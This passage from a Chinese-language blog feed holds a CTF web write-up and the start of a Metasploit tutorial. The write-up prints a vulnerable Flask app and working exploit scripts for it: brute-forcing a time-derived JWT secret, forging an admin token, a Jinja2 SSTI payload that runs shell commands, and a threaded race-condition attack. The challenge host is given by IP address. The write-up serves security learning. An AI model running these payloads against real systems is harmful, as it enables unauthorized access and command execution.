href="https://zhuanlan.zhihu.com/p/403063546#:~:text=%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%EF%BC%88Race%20condition,%E8%84%8F%E7%89%9B%EF%BC%88dirty%20cow%EF%BC%89%E3%80%82">https://zhuanlan.zhihu.com/p/403063546#:~:text&#x3D;%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%EF%BC%88Race%20condition,%E8%84%8F%E7%89%9B%EF%BC%88dirty%20cow%EF%BC%89%E3%80%82</a></p><p>看看app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, abort, redirect, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt, hashlib, time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">time_started = <span class="built_in">round</span>(time.time())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;System started at <span class="subst">&#123;time_started&#125;</span>&quot;</span>)</span><br><span class="line">APP_SECRET = hashlib.sha256(<span class="built_in">str</span>(time_started).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">tempuser = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">USER_DB = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Administrator&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;guest&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Guest User&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_required</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        cookie = request.cookies.get(<span class="string">&#x27;session&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> cookie <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            </span><br><span class="line">            response = redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            session = jwt.encode(USER_DB[<span class="string">&#x27;guest&#x27;</span>], APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user_data = jwt.decode(cookie, APP_SECRET, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> user_data[<span class="string">&#x27;role&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&quot;Admin access required.&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> user_data[<span class="string">&#x27;name&#x27;</span>] != <span class="string">&#x27;Administrator&#x27;</span>:</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&quot;Admin access required.&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.15</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            abort(<span class="number">401</span>, description = <span class="string">f&quot;Session expired. Please log in again. System has been running <span class="subst">&#123;<span class="built_in">round</span>(time.time() - time_started)&#125;</span> seconds.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs)</span><br><span class="line">    wrapper.__name__ = f.__name__</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_user</span>():</span><br><span class="line">    <span class="keyword">if</span> request.endpoint == <span class="string">&#x27;static&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">global</span> tempuser</span><br><span class="line">    cookie = request.cookies.get(<span class="string">&#x27;session&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> cookie <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        tempuser = USER_DB[<span class="string">&#x27;guest&#x27;</span>]</span><br><span class="line">        session = jwt.encode(tempuser, APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        response = redirect(request.path)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_data = jwt.decode(cookie, APP_SECRET, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">        tempuser = user_data</span><br><span class="line">    <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">        session = jwt.encode(USER_DB[<span class="string">&#x27;guest&#x27;</span>], APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        content = render_template_string(</span><br><span class="line">            <span class="string">&quot;Session expired. Please log in again. System has been running %d seconds.&quot;</span> %</span><br><span class="line">            (<span class="built_in">round</span>(time.time() - time_started))</span><br><span class="line">        )</span><br><span class="line">        response = app.make_response((content, <span class="number">401</span>))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_panel</span>():</span><br><span class="line">    <span class="keyword">global</span> tempuser</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Welcome Back, %s&quot;</span> % tempuser[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/static/&lt;path:filename&gt;&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.png&#x27;</span>):</span><br><span class="line">        abort(<span class="number">403</span>, description=<span class="string">&quot;Only .png files are allowed.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><img src="ccf578be4c0edd777dfbbb949ee6f75e.png" alt="d937c042-f0a4-4d35-87e8-808004609d98.png"  /><p>可以看見這兩用戶的DB</p><img src="2a1dc72ff37a75ee125f066b41d359ff.png" alt="2e5932f7-74b9-4686-821a-03330f9f1f58.png"  /><p>這個是一開始打開網站時會發出來的</p><p>我們可以在cookie下找到guest的token</p><p>token的結構是jwt , 我們可以在jwt.io看看:</p><p><a href="https://www.jwt.io/">https://www.jwt.io/</a></p><img src="ca45965f60d37209db106933797ee6c9.png" alt="a3486944-b81b-4c32-9c25-f84d65bf795c.png"  /><p>上面是加密方式,中間是身份信息,後面是secret , 我現在要找到secret并偽造admin的token</p><p>以下是python腳本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的网站</span></span><br><span class="line">url = <span class="string">&quot;http://8.147.132.32:24750/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建会话</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在寻找网站密钥...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 获取运行时间</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = session.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;invalid&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;获取错误信息...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;System has been running&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;System has been running (\d+) seconds&#x27;</span>, r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            uptime = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;网站运行了: <span class="subst">&#123;uptime&#125;</span> 秒&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 2. 计算启动时间</span></span><br><span class="line">            current_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">            time_started = current_time - uptime</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;网站启动时间大约是: <span class="subst">&#123;time_started&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 3. 在附近找正确的密钥</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在尝试可能的密钥...&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> ts <span class="keyword">in</span> <span class="built_in">range</span>(time_started - <span class="number">300</span>, time_started + <span class="number">300</span>):</span><br><span class="line">                secret = hashlib.sha256(<span class="built_in">str</span>(ts).encode()).hexdigest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 测试这个密钥是否正确  </span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># 用已知的guest token测试</span></span><br><span class="line">                    guest_token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Miwicm9sZSI6Imd1ZXN0IiwibmFtZSI6Ikd1ZXN0IFVzZXIifQ.C7nbrf18MKTAzyZRtBdgid4DO2ug6W8ApHIfR8tCbAE&quot;</span></span><br><span class="line">                    decoded = jwt.decode(guest_token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 如果成功解码，就找到了！</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;找到密钥了!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;启动时间戳: <span class="subst">&#123;ts&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;密钥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 4. 用这个密钥造管理员token</span></span><br><span class="line">                    admin_data = &#123;</span><br><span class="line">                        <span class="string">&quot;id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">                        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, </span><br><span class="line">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Administrator&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    admin_token = jwt.encode(admin_data, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;🪪 管理员Token: <span class="subst">&#123;admin_token&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 测试能不能进管理员页面</span></span><br><span class="line">                    r = session.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: admin_token&#125;)</span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;成功进入管理员页面!&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;现在可以用这个密钥做SSTI攻击了&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="comment"># 密钥不对，继续试</span></span><br><span class="line">                    <span class="keyword">if</span> ts % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;尝试中... <span class="subst">&#123;ts&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有找到运行时间信息&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><img src="ea07cdc17824f19a5c00f5c3c65e6596.png" alt="2e448acc-862a-491a-8c57-2789d6c94b14.png"  /><p>最後找到了 , 但是在&#x2F;admin沒有找到flag , &#x2F;admin&#x2F;都沒有 , 這裹要在&#x2F;admin的Welcome Back, {???} 進行ssti注入 , cat &#x2F;flag* , 以下為ssti的命令:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag*&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是只是這樣是不可以拿到flag的, 我要通过大量guest请求修改了全局的tempuser变量 , 将恶意SSTI payload注入到tempuser[‘name’]字段 , 在admin检查通过后、实际渲染前 , 成功将tempuser替换为包含SSTI payload的guest用户数据</p><p>線程1: Guest請求洪水攻擊</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flood_guest</span>():</span><br><span class="line">    <span class="keyword">nonlocal</span> success</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: malicious_token&#125;, timeout=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>線程2: Admin請求嘗試</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">try_admin</span>():</span><br><span class="line">    <span class="keyword">nonlocal</span> success</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: admin_token&#125;, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 檢查響應中是否包含flag</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] 找到flag: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>然後:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t1 = threading.Thread(target=flood_guest)</span><br><span class="line">t2 = threading.Thread(target=try_admin)</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line">t2.join()</span><br><span class="line">t1.join()</span><br></pre></td></tr></table></figure><p>最後腳本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8.147.132.32:24750/&quot;</span></span><br><span class="line">secret = <span class="string">&quot;812f7d41b298c20d8cb041daaa8c142b181838821de5647ad29fa4ef79c084f7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">precise_race_attack</span>():</span><br><span class="line">    <span class="keyword">import</span> jwt</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建恶意guest token</span></span><br><span class="line">    malicious_guest = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag*&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    malicious_token = jwt.encode(malicious_guest, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    admin_token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6IkFkbWluaXN0cmF0b3IifQ.LxCAaYZoEHhEzz26avKldy1azGXTX_XKQNBtSLn9QgY&quot;</span></span><br><span class="line">    </span><br><span class="line">    success = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">flood_guest</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> success</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: malicious_token&#125;, timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">try_admin</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> success</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            <span class="keyword">if</span> success:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url + <span class="string">&#x27;/admin&#x27;</span>, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: admin_token&#125;, timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] 找到flag: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">                    success = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">&quot;Welcome Back, &#123;&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[!] SSTI触发但未成功: <span class="subst">&#123;r.text[:<span class="number">100</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 启动精确竞争攻击...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    t1 = threading.Thread(target=flood_guest)</span><br><span class="line">    t2 = threading.Thread(target=try_admin)</span><br><span class="line">    </span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    </span><br><span class="line">    t2.join()</span><br><span class="line">    t1.join()</span><br><span class="line"></span><br><span class="line">precise_race_attack()</span><br></pre></td></tr></table></figure><img src="976833b3919881515e17650eeba314e9.png" alt="09fe970a-f75d-45fa-bd63-bde8d2a85d32.png"  />]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MSF的使用</title>
      <link href="/ghsc_ovo_0721/MSF%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/ghsc_ovo_0721/MSF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="MFS"><a href="#MFS" class="headerlink" title="MFS"></a>MFS</h1><p>Metasploit 简称（MSF）是一款流行的开源渗透测试框架，由Rapid7公司开发，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。并且该框架还提供了一系列攻击模块和Payload工具，可用于漏洞利用、及漏洞攻击。同时软件自身支持多种操作系统平台，包括Windows、Linux、MacOS等。直到今天Metasploit已成为众多黑客手中渗透攻击的利器，并在安全领域大展身手。</p><p>Metasploit框架主要包含以下几个组件：</p><p>模块库：包含了一系列攻击模块和Payload工具，用户可以利用这些模块快速构造攻击代码。</p><ul><li>Payload生成器：支持生成多种类型的Payload，包括反向Shell、Meterpreter、WebShell等。</li><li>渗透测试工具：支持多种渗透测试技术，包括端口扫描、漏洞扫描、密码破解等。</li><li>数据库：用于存储Metasploit框架的数据和攻击结果，包括模块信息、主机信息、漏洞信息等。</li><li>插件系统：支持自定义插件，可以扩展Metasploit的功能。</li></ul><h2 id="本次的環境"><a href="#本次的環境" class="headerlink" title="本次的環境"></a>本次的環境</h2><p>用的是Kali Linux (2024.1) , 內有MSF , 如果沒有安裝用:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure><p>查看Kali Linux 系统IP地址:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p>可以ping一下確認是否能連接</p><h3 id="1-開啟MFS"><a href="#1-開啟MFS" class="headerlink" title="1.開啟MFS"></a>1.開啟MFS</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><img src="b3f76b0bef73f1c0939cd5e094b504de.png" alt="5bb5f421-78a1-49fa-970b-e7291b9ee6de.png" style="zoom:50%;" /><br/><h2 